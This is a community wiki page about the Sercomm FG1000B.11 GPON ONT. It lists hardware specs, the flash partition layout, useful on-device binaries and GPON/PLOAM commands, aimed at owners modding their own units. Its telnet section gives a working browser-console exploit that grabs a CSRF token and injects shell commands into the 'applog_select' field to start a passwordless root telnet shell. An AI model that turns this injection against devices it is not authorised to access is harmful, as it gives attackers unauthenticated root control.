---
title: Sercomm FG1000B.11
has_children: false
layout: default
parent: Sercomm
---

# Hardware Specifications

|                 |                        |
| --------------- | ---------------------- |
| Vendor/Brand    | Sercomm                |
| Model           | FG1000B.11             |
| ODM             | ✅                     |
| Chipset         | BCM68360_B1            |
| Flash           | NAND 128 MB            |
| RAM             | 256 MB                 |
| CPU             | Broadcom B53 Dual Core |
| CPU Clock       | 1500MHz                |
| Bootloader      | CFE                    |
| Load addr       | 0x80000                |
| 2.5GBaseT       | Yes                    |
| PHY Ethernet    | RTL8221B               |
| Optics          | SC/APC                 |
| IP address      | 192.168.100.1/24       |
| Web Gui         | ✅, no login needed    |
| SSH             | No                     |
| Telnet          | No                     |
| Serial          | ✅, only TX            |
| Serial baud     | 115200                 |
| Serial encoding | 8-N-1                  |
| Form Factor     | ONT                    |


{% include image.html file="fg1000b-11_rear.jpg" alt="Sercomm FG1000B.11" caption="Sercomm FG1000B.11 rear" %}
{% include image.html file="fg1000b-11_bottom.jpg" alt="Sercomm FG1000B.11 bottom" caption="Sercomm FG1000B.11 bottom" %}
{% include image.html file="fg1000b-11_side1.jpg" alt="Sercomm FG1000B.11 side 1" caption="Sercomm FG1000B.11 side 1" %}
{% include image.html file="fg1000b-11_side2.jpg" alt="Sercomm FG1000B.11 side 2" caption="Sercomm FG1000B.11 side 2" %}

## Serial

See picture side2 for the pin identification, use 112500 8-N-1
The ONT seems only to display output of the ROM CFE and flash CFE, but don't allow interupting the boot...

{% include serial_dump.html file="fg1000b-11_boot_cfe.txt" alt="Sercomm FG1000B.11 CFE boot dump" title="Sercomm FG1000B.11 CFE boot dump" %}

## Root procedure
See how the enable telnet/ssh section.

## List of software versions

Current only version seen is: 090144.1.0.001

## List of partitions
```
cat /proc/mtd 
dev:    size   erasesize  name
mtd0: 00200000 00020000 "CfeROM"
mtd1: 00400000 00020000 "CfeRAM1"
mtd2: 00400000 00020000 "CfeRAM2"
mtd3: 000a0000 00020000 "FlashMAP"
mtd4: 000a0000 00020000 "SN"
mtd5: 00140000 00020000 "Protect"
mtd6: 01b80000 00020000 "Rootfs1"
mtd7: 00c80000 00020000 "Lib1"
mtd8: 01b80000 00020000 "Rootfs2"
mtd9: 00c80000 00020000 "Lib2"
mtd10: 000a0000 00020000 "Bootflg"
mtd11: 000a0000 00020000 "Rootfs1_Info"
mtd12: 000a0000 00020000 "Lib1_Info"
mtd13: 000a0000 00020000 "Rootfs2_Info"
mtd14: 000a0000 00020000 "Lib2_Info"
mtd15: 00280000 00020000 "XMLConfig"
mtd16: 00280000 00020000 "Erasable_XML_CFG"
mtd17: 00960000 00020000 "AppData"
mtd18: 00140000 00020000 "Yaffs"
mtd19: 010c0000 00020000 "Reserve"
mtd20: 00930000 0001f000 "rootfs_ubifs"
mtd21: 0029bf98 0001f000 "filestruct_full.bin"
mtd22: 003bd000 0001f000 "lib_squashfs"
```
# Useful files and binaries

{% include alert.html content="warning calling the `board_init` binary directly or inderactly (via init script) when the board is already booted will cause NanD mtd 5, 15, 16 & 17 to be erased ! please backup those before any hacking !. Recovery is possible if you hardware reset the device, enable the telnet and recreate the 'customer_sn,gpon_sn,hw_version,mac_addr,pcba_sn' file on the '/tmp/var_link_dir/ft' volume which can be remount R/W 'mount -o remount,rw /dev/mtdblock5 /tmp/var_link_dir/ft'. Beware of the 'flash_eraseall' binary which may be erasing all the nand (not tested)" alert="Warning" icon="svg-warning" color="red" %}

{% include alert.html content="nand MTD 5 mounted as  '/tmp/var_link_dir/ft' contains all serials and mac address of the ONT, please consider backup before any hack' files: 'customer_sn,gpon_sn,hw_version,mac_addr,pcba_sn' " alert="Warning" icon="svg-warning" color="red" %}

## Useful files

## Useful binaries
`pb_ap` - monitor de reset button, push > 10s reset to factory default, otherwise reset the device - run at startup - no args

`fw_image_ctl` - allow firmware info, upgrade, switch between fw0 & fw1, repliacte fw_x to fw_1, desactivate image etc... - options listes when called woth no args

`cmld_client`- manipulate the configuration 'DB' stored in a /dev/mtd15, output is XML format. The root element is "InternetGatewayDevice" you need to use a final '.' dot to list all sub-element. example to get the full device XML config 'cmld_client get_node InternetGatewayDevice.'. Element with writable="1" can be changed with 'set' and the node path. Element marked dynamic="1" have their value evaluated at the time you specifically call get on the node, `cmld_client get  InternetGatewayDevice.WANDevice.1.X_SC_GponInterfaceConfig.Status` - the daemon is run at startup - option list whe called with no args

# Usage

## Enable telnet/SSH/serial

Below code can be pasted in the browser console after loading the http://192.168.100.1 (default ONT page). This will enable telnet as root with no password on the device ( same can be done with '/usr/sbin/sshd' binary). The below hack uses an injection exploit on the 'eventlog_applog_download.json' page, command can be injected in the request body 'applog_select' parameter and are executed as superadmin(root).
```
// Fetch a non csrf protected page to get a csrf token
await fetch("http://192.168.100.1/setup.cgi?next_file=statusandsupport/status.html").then(function (response) {
	return response.text();
}).then(function (html) {
	//inject the html response into a HTML DOM to parse it
    var el = document.createElement( 'html' );
    el.innerHTML = html;
	//The token is inserted into the first <script> tag of the page
    var es = el.getElementsByTagName( 'script' );
	var aText = es[0].text;
	//Add the csrf token in the document for other requests
    document.csrf_token = aText.match("'(.*)'")[1];
}).catch(function (err) {
	console.warn('Something went wrong.', err);
});

//use the csrf token to activate telnet with no login and a shell

fetch('http://192.168.100.1/data/statussupporteventlog_applog_download.json?_=1686211215966&csrf_token='+document.csrf_token, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
  },
  body: 'applog_select=a;echo "#!/bin/sh" > /tmp/slogin;echo "export PATH=/bin:/sbin:/usr/bin:/usr/sbin" >> /tmp/slogin;echo "/bin/sh" >> /tmp/slogin;/bin/chmod 755 /tmp/slogin;/usr/sbin/telnetd -l /tmp/slogin'
})
.then(res => res.json())
.then(console.log)
```


# GPON ONU status

## Get the operational status of the ONU
```gponctl getState``` 

## Get information of the OLT vendor
```umci_ctl stack get olt_type```
or
```umci_ctl rg help```

## Querying a particular OMCI ME
```umci_ctl mib```

## Getting/Setting Speed LAN Mode

# GPON/OMCI settings
## Getting/Setting ONU GPON PLOAM password

PLOAM can be set directly for Text or Hexa(without 0x) via Web interface if <10 digit otherwise POST call to URL allow > 10 digits for example 20 digit hex can be setup via (max is 36 digit):

```
curl -i -s -k -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' \
    -d $'ploam_password=00000XXXXXXXXXXXXXXX' \
    $'http://192.168.100.1/ONT/client/data/Router.json'
```

# Miscellaneous Links

- [FG1000B.11 - lafibre.info](https://lafibre.info/remplacer-bbox/test-glasfaser-modem-2-telekom-pour-remplacement-ont-2-5gbe-synchro-ok-ipv4-ok/)

# Other brand names

 - 1&1 Glasfaser Modem
 - Telekom Glasfaser Modem 2


